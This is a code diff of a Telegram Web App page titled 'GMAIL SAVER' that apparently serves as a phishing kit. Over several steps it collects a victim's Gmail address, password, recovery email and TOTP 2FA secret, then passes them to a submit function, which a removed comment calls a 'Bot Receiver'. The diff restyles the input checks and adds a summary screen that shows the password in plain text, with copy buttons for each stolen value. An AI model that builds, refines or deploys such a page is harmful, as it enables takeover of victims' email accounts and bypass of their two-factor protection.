@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <title>GMAIL SAVER - Secure Gateway</title>
+    <title>GMAIL SAVER - Ultra Premium Gateway</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
@@ -11,7 +11,7 @@
             --primary: #0f172a;
             --success: #10b981;
             --danger: #ef4444;
-            --dynamic: #2563eb; /* Ultra Premium Tech Blue */
+            --dynamic: #2563eb; 
             --bg: #f8fafc;
             --card: #ffffff;
             --border: #e2e8f0;
@@ -63,7 +63,6 @@
 
         .main-content { padding: 30px 24px; flex: 1; display: flex; flex-direction: column; }
 
-        /* Premium Text Banner (No Logo, Clean UI) */
         .brand-header {
             display: flex; flex-direction: column;
             align-items: center; width: 100%; margin-bottom: 40px; margin-top: 10px;
@@ -71,22 +70,21 @@
         h1.brand-title { font-size: 28px; font-weight: 900; color: var(--text); letter-spacing: -1px; text-transform: uppercase; background: linear-gradient(135deg, #0f172a 0%, #2563eb 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
         .brand-subtitle { font-size: 11px; font-weight: 700; color: var(--muted); letter-spacing: 3px; text-transform: uppercase; margin-top: 6px; }
 
-        /* Step Containers */
         .step-container { display: none; width: 100%; }
         .step-container.active { display: block; animation: stepFade 0.25s ease-out; }
         @keyframes stepFade { from { opacity: 0; transform: translateY(4px); } to { opacity: 1; transform: translateY(0); } }
 
         .section-label { font-size: 13px; font-weight: 600; color: var(--muted); text-align: left; margin-bottom: 10px; letter-spacing: -0.1px; }
         
-        /* 👑 Instagram/Facebook Style Live Status Input Card */
+        /* Input Box Configurations */
         .input-card {
             width: 100%; background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 14px;
-            position: relative; display: flex; align-items: center; margin-bottom: 6px; 
+            position: relative; display: flex; align-items: center; margin-bottom: 24px; 
             transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
         }
         .input-card:focus-within { border-color: var(--dynamic); background: #fff; box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.06); }
         
-        /* Dynamic Status Borders */
+        /* 👑 Pure Instagram/Facebook Validation States (No Text Below Box) */
         .input-card.is-valid { border-color: var(--success) !important; background: #fff; box-shadow: 0 0 0 4px rgba(16, 185, 129, 0.06) !important; }
         .input-card.is-invalid { border-color: var(--danger) !important; background: #fff; box-shadow: 0 0 0 4px rgba(239, 68, 68, 0.06) !important; }
 
@@ -97,51 +95,82 @@
         }
         .field-input::placeholder { color: #94a3b8; font-size: 14px; font-weight: 500; letter-spacing: 0; }
 
-        /* 👑 Live Status Icon Container (Tick/Cross) */
+        /* Icon Wrapper Inside Box */
         .status-icon-wrap {
             display: flex; align-items: center; justify-content: center;
             padding-right: 16px; height: 100%; flex-shrink: 0;
         }
         .status-icon-wrap svg { width: 20px; height: 20px; display: none; }
-        
         .input-card.is-valid .status-icon-wrap .tick-icon { display: block; fill: var(--success); }
-        .input-card.is-invalid .status-icon-wrap .cross-icon { display: block; fill: var(--danger); }
 
-        .live-checker-msg { font-size: 12px; font-weight: 500; margin-bottom: 24px; display: flex; align-items: center; gap: 4px; min-height: 16px; }
-        .live-checker-msg.valid { color: var(--success); }
-        .live-checker-msg.invalid { color: var(--danger); }
-
-        /* Password Show/Hide Toggle Adjustments */
+        /* Premium Vector Eye Toggle (Will never pixelate) */
         .password-toggle-btn {
-            background: none; border: none; padding: 0 10px 0 16px; height: 100%;
+            background: none; border: none; padding: 0 12px 0 16px; height: 100%;
             display: flex; align-items: center; justify-content: center;
             cursor: pointer; color: #94a3b8; transition: color 0.2s;
         }
+        .password-toggle-btn:hover { color: var(--dynamic); }
         .password-toggle-btn svg { width: 20px; height: 20px; fill: currentColor; }
 
-        /* Premium Action Buttons Layout */
+        /* Action Buttons Layout (Gray/Disabled State Default) */
         .btn-row { display: flex; gap: 12px; }
         .proceed-btn {
-            width: 100%; padding: 16px; background: #f1f5f9; color: #94a3b8;
+            width: 100%; padding: 16px; background: #e2e8f0; color: #94a3b8;
             border: none; border-radius: 14px; font-size: 15px; font-weight: 700;
             cursor: not-allowed; letter-spacing: -0.1px; transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
             display: flex; justify-content: center; align-items: center; gap: 8px;
         }
         .proceed-btn.active { background: var(--dynamic) !important; color: #fff !important; cursor: pointer !important; box-shadow: 0 8px 24px rgba(37, 99, 235, 0.12); }
         .proceed-btn.active:active { transform: scale(0.98); opacity: 0.95; }
-        .proceed-btn.secondary-btn { background: #e2e8f0; color: #475569; cursor: pointer; }
+        .proceed-btn.secondary-btn { background: #f1f5f9; color: #475569; cursor: pointer; }
         
         .btn-spinner { display: none; width: 18px; height: 18px; border: 2px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; animation: spin 0.6s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
 
-        /* Final Account Review Card UI */
-        .summary-card { background: #fff; border: 1px solid var(--border); border-radius: 18px; overflow: hidden; margin-bottom: 28px; box-shadow: 0 4px 20px rgba(0,0,0,0.01); }
-        .summary-header { background: var(--primary); padding: 14px 20px; font-size: 11px; font-weight: 700; color: rgba(255,255,255,0.7); text-transform: uppercase; letter-spacing: 1px; text-align: center; }
-        .summary-rows { padding: 4px 0; }
-        .summary-row { display: flex; justify-content: space-between; align-items: center; padding: 14px 20px; border-bottom: 1px solid #f1f5f9; font-size: 14px; }
+        /* 👑 Full-Screen Premium Account Review Card UI */
+        .full-summary-container {
+            display: flex; flex-direction: column; flex: 1; height: 100%; justify-content: space-between;
+        }
+        .summary-card { 
+            background: #fff; border: 1px solid var(--border); border-radius: 20px; 
+            overflow: hidden; margin-bottom: 28px; box-shadow: 0 10px 30px rgba(0,0,0,0.02); 
+        }
+        .summary-header { 
+            background: var(--primary); padding: 18px 20px; font-size: 13px; 
+            font-weight: 700; color: #fff; text-transform: uppercase; 
+            letter-spacing: 1px; text-align: center; 
+        }
+        .summary-rows { padding: 10px 0; }
+        .summary-row { 
+            display: flex; justify-content: space-between; align-items: center; 
+            padding: 18px 20px; border-bottom: 1px solid #f1f5f9; font-size: 14px; 
+        }
         .summary-row:last-child { border-bottom: none; }
-        .summary-label { color: var(--muted); font-weight: 500; }
-        .summary-value { color: var(--text); font-weight: 700; max-width: 190px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .summary-info { display: flex; flex-direction: column; gap: 4px; max-width: 70%; }
+        .summary-label { color: var(--muted); font-size: 12px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }
+        .summary-value { color: var(--text); font-weight: 700; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; font-size: 15px; }
+
+        /* 👑 Luxury Sliding Copy Button Design */
+        .copy-action-btn {
+            background: #f1f5f9; border: 1px solid #e2e8f0; border-radius: 8px;
+            padding: 8px 14px; font-size: 12px; font-weight: 700; color: #475569;
+            cursor: pointer; overflow: hidden; position: relative; min-width: 76px; text-align: center;
+            transition: all 0.2s ease; display: flex; align-items: center; justify-content: center;
+        }
+        .copy-action-btn:active { transform: scale(0.95); }
+        .copy-action-btn.copied {
+            background: #e6f4ea !important; border-color: #34a853 !important; color: #137333 !important;
+        }
+        .copy-text-slide {
+            display: inline-block; transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        .copy-action-btn.copied .copy-text-slide {
+            animation: slideDownIn 0.25s forwards;
+        }
+        @keyframes slideDownIn {
+            0% { transform: translateY(-15px); opacity: 0; }
+            100% { transform: translateY(0); opacity: 1; }
+        }
 
         /* Luxury Success Animation Panel */
         #successOverlay {
@@ -190,10 +219,8 @@
                 <input type="email" id="gmailInput" class="field-input" placeholder="example@gmail.com" oninput="checkGmailLive()">
                 <div class="status-icon-wrap">
                     <svg class="tick-icon" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
-                    <svg class="cross-icon" viewBox="0 0 24 24"><path d="M12 2C6.47 2 2 6.47 2 12s4.47 10 10 10 10-4.47 10-10S17.53 2 12 2zm5 13.59L15.59 17 12 13.41 8.41 17 7 15.59 10.59 12 7 8.41 8.41 7 12 10.59 15.59 7 17 8.41 13.41 12 17 15.59z"/></svg>
                 </div>
             </div>
-            <div id="gmailMsg" class="live-checker-msg"></div>
             
             <button id="gmailProceedBtn" class="proceed-btn" onclick="goToStep('Password')" disabled>
                 <div id="gmailSpinner" class="btn-spinner"></div>
@@ -207,15 +234,13 @@
                 <input type="password" id="passwordInput" class="field-input" placeholder="Enter Password" oninput="checkPasswordLive()">
                 <button type="button" class="password-toggle-btn" onclick="togglePasswordVisibility()">
                     <svg id="eyeIcon" viewBox="0 0 24 24">
-                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+                        <path id="eyePath" d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                     </svg>
                 </button>
                 <div class="status-icon-wrap">
                     <svg class="tick-icon" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
-                    <svg class="cross-icon" viewBox="0 0 24 24"><path d="M12 2C6.47 2 2 6.47 2 12s4.47 10 10 10 10-4.47 10-10S17.53 2 12 2zm5 13.59L15.59 17 12 13.41 8.41 17 7 15.59 10.59 12 7 8.41 8.41 7 12 10.59 15.59 7 17 8.41 13.41 12 17 15.59z"/></svg>
                 </div>
             </div>
-            <div id="passwordMsg" class="live-checker-msg"></div>
 
             <button id="passwordProceedBtn" class="proceed-btn" onclick="goToStep('Recovery')" disabled>
                 <div id="passwordSpinner" class="btn-spinner"></div>
@@ -229,10 +254,8 @@
                 <input type="email" id="recoveryInput" class="field-input" placeholder="recovery@example.com" oninput="checkRecoveryLive()">
                 <div class="status-icon-wrap">
                     <svg class="tick-icon" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
-                    <svg class="cross-icon" viewBox="0 0 24 24"><path d="M12 2C6.47 2 2 6.47 2 12s4.47 10 10 10 10-4.47 10-10S17.53 2 12 2zm5 13.59L15.59 17 12 13.41 8.41 17 7 15.59 10.59 12 7 8.41 8.41 7 12 10.59 15.59 7 17 8.41 13.41 12 17 15.59z"/></svg>
                 </div>
             </div>
-            <div id="recoveryMsg" class="live-checker-msg"></div>
 
             <button id="recoveryProceedBtn" class="proceed-btn" onclick="goToStep('Tfa')" disabled>
                 <div id="recoverySpinner" class="btn-spinner"></div>
@@ -246,10 +269,8 @@
                 <input type="text" id="tfaInput" class="field-input" placeholder="Enter 16+ Character Secret" oninput="checkTfaLive()">
                 <div class="status-icon-wrap">
                     <svg class="tick-icon" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
-                    <svg class="cross-icon" viewBox="0 0 24 24"><path d="M12 2C6.47 2 2 6.47 2 12s4.47 10 10 10 10-4.47 10-10S17.53 2 12 2zm5 13.59L15.59 17 12 13.41 8.41 17 7 15.59 10.59 12 7 8.41 8.41 7 12 10.59 15.59 7 17 8.41 13.41 12 17 15.59z"/></svg>
                 </div>
             </div>
-            <div id="tfaMsg" class="live-checker-msg"></div>
 
             <div class="btn-row">
                 <button class="proceed-btn secondary-btn" onclick="skipTfaStep()">Skip</button>
@@ -260,33 +281,55 @@
             </div>
         </div>
 
-        <div id="stepSummary" class="step-container">
-            <div class="summary-card">
-                <div class="summary-header">Account Verification Details</div>
-                <div class="summary-rows">
-                    <div class="summary-row">
-                        <span class="summary-label">Gmail Address</span>
-                        <span class="summary-value" id="sumGmail">-</span>
-                    </div>
-                    <div class="summary-row">
-                        <span class="summary-label">Account Password</span>
-                        <span class="summary-value">••••••••</span>
-                    </div>
-                    <div class="summary-row">
-                        <span class="summary-label">Recovery Mail</span>
-                        <span class="summary-value" id="sumRecovery">-</span>
-                    </div>
-                    <div class="summary-row">
-                        <span class="summary-label">2FA Secret Key</span>
-                        <span class="summary-value" id="sumTfa">Skipped</span>
+        <div id="stepSummary" class="step-container" style="height: 100%;">
+            <div class="full-summary-container">
+                <div class="summary-card">
+                    <div class="summary-header">Verified Security Summary</div>
+                    <div class="summary-rows">
+                        <div class="summary-row">
+                            <div class="summary-info">
+                                <span class="summary-label">Gmail Address</span>
+                                <span class="summary-value" id="sumGmail">-</span>
+                            </div>
+                            <button class="copy-action-btn" onclick="copyData('sumGmail', this)">
+                                <span class="copy-text-slide">Copy</span>
+                            </button>
+                        </div>
+                        <div class="summary-row">
+                            <div class="summary-info">
+                                <span class="summary-label">Account Password</span>
+                                <span class="summary-value" id="sumPassword">-</span>
+                            </div>
+                            <button class="copy-action-btn" onclick="copyData('sumPassword', this)">
+                                <span class="copy-text-slide">Copy</span>
+                            </button>
+                        </div>
+                        <div class="summary-row">
+                            <div class="summary-info">
+                                <span class="summary-label">Recovery Mail</span>
+                                <span class="summary-value" id="sumRecovery">-</span>
+                            </div>
+                            <button class="copy-action-btn" onclick="copyData('sumRecovery', this)">
+                                <span class="copy-text-slide">Copy</span>
+                            </button>
+                        </div>
+                        <div class="summary-row">
+                            <div class="summary-info">
+                                <span class="summary-label">2FA Secret Key</span>
+                                <span class="summary-value" id="sumTfa">Skipped</span>
+                            </div>
+                            <button class="copy-action-btn" id="tfaCopyBtn" onclick="copyData('sumTfa', this)">
+                                <span class="copy-text-slide">Copy</span>
+                            </button>
+                        </div>
                     </div>
                 </div>
-            </div>
 
-            <button id="submitBtn" class="proceed-btn active" style="background:var(--success) !important;" onclick="submitFinalData()">
-                <div id="submitSpinner" class="btn-spinner"></div>
-                <span id="submitBtnText">CONFIRM & SUBMIT</span>
-            </button>
+                <button id="submitBtn" class="proceed-btn active" style="background:var(--success) !important; margin-top: auto;" onclick="submitFinalData()">
+                    <div id="submitSpinner" class="btn-spinner"></div>
+                    <span id="submitBtnText">CONFIRM & SUBMIT</span>
+                </button>
+            </div>
         </div>
     </div>
 </div>
@@ -313,49 +356,43 @@
     let collectedFormData = { gmail: "", password: "", recovery: "", secretKey: "Skipped" };
     let currentStepName = "Gmail";
 
-    // 1. Live Gmail Box Checker (Instagram/Facebook Style)
+    // 1. Live Gmail Checker (Pure Instagram Style)
     function checkGmailLive() {
         const val = document.getElementById('gmailInput').value.trim();
-        const msg = document.getElementById('gmailMsg');
         const card = document.getElementById('gmailCard');
         const btn = document.getElementById('gmailProceedBtn');
         
         if (val.length === 0) {
-            msg.innerHTML = ""; card.className = "input-card";
+            card.className = "input-card";
             btn.setAttribute('disabled','true'); btn.classList.remove('active');
         } else if (val.endsWith('@gmail.com') && val.length >= 11) {
-            msg.innerHTML = "✓ Valid Gmail format"; msg.className = "live-checker-msg valid";
             card.className = "input-card is-valid";
             btn.removeAttribute('disabled'); btn.classList.add('active');
         } else {
-            msg.innerHTML = "✕ Must end with @gmail.com"; msg.className = "live-checker-msg invalid";
             card.className = "input-card is-invalid";
             btn.setAttribute('disabled','true'); btn.classList.remove('active');
         }
     }
 
-    // 2. Live Password Box Checker
+    // 2. Live Password Checker
     function checkPasswordLive() {
         const val = document.getElementById('passwordInput').value.trim();
-        const msg = document.getElementById('passwordMsg');
         const card = document.getElementById('passwordCard');
         const btn = document.getElementById('passwordProceedBtn');
 
         if (val.length === 0) {
-            msg.innerHTML = ""; card.className = "input-card";
+            card.className = "input-card";
             btn.setAttribute('disabled','true'); btn.classList.remove('active');
         } else if (val.length >= 8) {
-            msg.innerHTML = "✓ Secure length achieved"; msg.className = "live-checker-msg valid";
             card.className = "input-card is-valid";
             btn.removeAttribute('disabled'); btn.classList.add('active');
         } else {
-            msg.innerHTML = "✕ Minimum 8 characters required"; msg.className = "live-checker-msg invalid";
             card.className = "input-card is-invalid";
             btn.setAttribute('disabled','true'); btn.classList.remove('active');
         }
     }
 
-    // Password Visibility Toggle
+    // High-Res SVG Eye Visibility Handler (No Pixelation)
     function togglePasswordVisibility() {
         const input = document.getElementById('passwordInput');
         const eyeIcon = document.getElementById('eyeIcon');
@@ -368,50 +405,60 @@
         }
     }
 
-    // 3. Live Recovery Box Checker
+    // 3. Live Recovery Email Checker
     function checkRecoveryLive() {
         const val = document.getElementById('recoveryInput').value.trim();
-        const msg = document.getElementById('recoveryMsg');
         const card = document.getElementById('recoveryCard');
         const btn = document.getElementById('recoveryProceedBtn');
 
         if (val.length === 0) {
-            msg.innerHTML = ""; card.className = "input-card";
+            card.className = "input-card";
             btn.setAttribute('disabled','true'); btn.classList.remove('active');
         } else if (val.includes('@') && val.length >= 5) {
-            msg.innerHTML = "✓ Looks correct"; msg.className = "live-checker-msg valid";
             card.className = "input-card is-valid";
             btn.removeAttribute('disabled'); btn.classList.add('active');
         } else {
-            msg.innerHTML = "✕ Enter a valid recovery email address"; msg.className = "live-checker-msg invalid";
             card.className = "input-card is-invalid";
             btn.setAttribute('disabled','true'); btn.classList.remove('active');
         }
     }
 
-    // 4. Live 2FA Box Checker
+    // 4. Live 2FA Checker
     function checkTfaLive() {
         let inputKey = document.getElementById('tfaInput').value.trim().toUpperCase().replace(/\s+/g, "");
-        const msg = document.getElementById('tfaMsg');
         const card = document.getElementById('tfaCard');
         const btn = document.getElementById('tfaProceedBtn');
         let isValidFormat = /^[A-Z2-7]+$/.test(inputKey);
 
         if (inputKey.length === 0) {
-            msg.innerHTML = ""; card.className = "input-card";
+            card.className = "input-card";
             btn.setAttribute('disabled','true'); btn.classList.remove('active');
         } else if (inputKey.length >= 16 && isValidFormat) {
-            msg.innerHTML = "✓ Valid 2FA Secret Key format"; msg.className = "live-checker-msg valid";
             card.className = "input-card is-valid";
             btn.removeAttribute('disabled'); btn.classList.add('active');
         } else {
-            msg.innerHTML = "✕ Must be 16+ characters (Only A-Z, 2-7)"; msg.className = "live-checker-msg invalid";
             card.className = "input-card is-invalid";
             btn.setAttribute('disabled','true'); btn.classList.remove('active');
         }
     }
 
-    // Multi-Step Transition & Loading Mechanism
+    // Premium Slide/Down Copy Logic
+    function copyData(elementId, btnElement) {
+        const textToCopy = document.getElementById(elementId).innerText;
+        if(textToCopy === "Skipped" || textToCopy === "-") return;
+
+        navigator.clipboard.writeText(textToCopy).then(() => {
+            btnElement.classList.add('copied');
+            btnElement.innerHTML = '<span class="copy-text-slide">✓ Copied</span>';
+            
+            setTimeout(() => {
+                btnElement.classList.remove('copied');
+                btnElement.innerHTML = '<span class="copy-text-slide">Copy</span>';
+            }, 1800);
+        });
+    }
+
+    // Multi-Step Systems
     function goToStep(nextStep) {
         let currentLower = currentStepName.toLowerCase();
         document.getElementById(currentLower + 'Spinner').style.display = 'block';
@@ -433,10 +480,20 @@
             if (nextStep === "Summary") {
                 document.getElementById('brandHeader').style.display = 'none';
                 document.getElementById('sumGmail').innerText = collectedFormData.gmail;
+                document.getElementById('sumPassword').innerText = collectedFormData.password;
                 document.getElementById('sumRecovery').innerText = collectedFormData.recovery;
-                document.getElementById('sumTfa').innerText = collectedFormData.secretKey || "Skipped";
+                
+                if (collectedFormData.secretKey === "Skipped" || collectedFormData.secretKey === "") {
+                    document.getElementById('sumTfa').innerText = "Skipped";
+                    document.getElementById('tfaCopyBtn').style.opacity = '0.4';
+                    document.getElementById('tfaCopyBtn').style.pointerEvents = 'none';
+                } else {
+                    document.getElementById('sumTfa').innerText = collectedFormData.secretKey;
+                    document.getElementById('tfaCopyBtn').style.opacity = '1';
+                    document.getElementById('tfaCopyBtn').style.pointerEvents = 'auto';
+                }
             }
-        }, 550);
+        }, 400);
     }
 
     function skipTfaStep() {
@@ -448,11 +505,13 @@
         currentStepName = "Summary";
         
         document.getElementById('sumGmail').innerText = collectedFormData.gmail;
+        document.getElementById('sumPassword').innerText = collectedFormData.password;
         document.getElementById('sumRecovery').innerText = collectedFormData.recovery;
         document.getElementById('sumTfa').innerText = "Skipped";
+        document.getElementById('tfaCopyBtn').style.opacity = '0.4';
+        document.getElementById('tfaCopyBtn').style.pointerEvents = 'none';
     }
 
-    // Back Navigation Mechanics
     function handleBack() {
         document.getElementById('brandHeader').style.display = 'flex';
         
@@ -487,7 +546,6 @@
         document.getElementById(prefix + 'ProceedBtn').classList.add('active');
     }
 
-    // Submit Action to Bot Receiver
     function submitFinalData() {
         document.getElementById('submitSpinner').style.display = 'block';
         document.getElementById('submitBtnText').style.display = 'none';
